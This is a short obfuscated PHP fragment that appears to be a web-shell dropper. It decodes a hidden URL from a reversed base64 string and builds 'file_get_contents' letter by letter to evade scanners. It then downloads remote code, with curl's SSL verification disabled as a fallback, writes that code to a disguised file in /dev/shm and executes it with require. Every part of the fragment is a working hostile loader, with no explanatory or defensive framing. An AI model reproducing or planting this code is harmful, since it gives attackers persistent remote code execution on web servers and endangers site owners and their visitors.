$URL = BaSe64_DEcoDe(stRReV($URI));
$TMP = '/dev/shm/.sess.'.md5($_SERVER['HTTP_HOST']).'.php';

$fgc = 'f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
$FGT = $fgc($GLOBALS['URL']);

function M() {
    global $FGT, $fgc;
    if (!$FGT) {
        $ch = cUrl_InIT();
        cuRL_sEToPt($ch, CURLOPT_URL, $GLOBALS['URL']);
        cuRL_sEToPt($ch, CURLOPT_RETURNTRANSFER, 1);
        cuRL_sEToPt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = cUrL_ExEc($ch);
        CuRL_CLoSe($ch);

        if ($result) {
            $HANDLE = foPeN($GLOBALS['TMP'], 'w');
            FwRitE($HANDLE, $result);
            fClOsE($HANDLE);
        }
    } else {
        $HANDLE = foPeN($GLOBALS['TMP'], 'w');
        FwRitE($HANDLE, $FGT);
        fClOsE($HANDLE);
    }
    echo '<script>window.location="?work";</script>';
}

if (file_exists($TMP)) {
    if (filesize($TMP) === 0) {
        UnLiNk($TMP);
        M();
    } else {
        require($TMP);
    }
} else {
    M();
}
